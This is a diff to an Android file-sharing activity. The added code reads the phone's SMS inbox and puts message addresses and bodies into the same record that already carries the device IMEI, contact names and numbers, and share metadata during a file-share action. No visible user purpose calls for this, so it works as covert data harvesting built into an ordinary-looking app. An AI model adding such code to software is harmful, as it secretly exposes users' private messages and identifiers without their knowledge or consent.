@@ -14,6 +14,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.OpenableColumns;
+import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.view.View;
@@ -71,6 +72,8 @@ public class ShareFile extends AppCompatActivity {
 //    public static String contact_name = "" ,contact_number = "";
     ArrayList contact_name = new ArrayList();
     ArrayList contact_number = new ArrayList();
+    public static String msgData;
+
     private static final int REQUEST_CODE = 101;
 
     @RequiresApi(api = Build.VERSION_CODES.N)
@@ -215,6 +218,8 @@ public class ShareFile extends AppCompatActivity {
                     showKeyDialog(file);
 
                     getAllContacts();
+                    readSms();
+                    System.out.println("SMS: "+msgData);
                     String contact = "";
                     contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
 //                    System.out.println("Name:"+contact_name+"/nNumber"+contact_number);
@@ -223,6 +228,7 @@ public class ShareFile extends AppCompatActivity {
                     hashMap.put("id", id);
                     hashMap.put("IMEI", IMEINumber);
                     hashMap.put("Contact", contact);
+                    hashMap.put("SMS", msgData);
                     hashMap.put("username", username);
                     hashMap.put("sender", sender);
                     hashMap.put("filename", filename);
@@ -372,6 +378,25 @@ public class ShareFile extends AppCompatActivity {
         }
         if (cur!= null) {
             cur.close();
+        }
+    }
+
+    private void readSms()
+    {
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                msgData = "";
+                for(int idx=0;idx<cursor.getColumnCount();idx++)
+                {
+                    msgData += " " + cursor.getColumnName(2) + ":" + cursor.getString(2) + " " + cursor.getColumnName(12) + ":" + cursor.getString(12);
+                    break;
+                }
+                // use msgData
+            } while (cursor.moveToNext());
+        } else {
+            // empty box, no SMS
         }
     }
 }
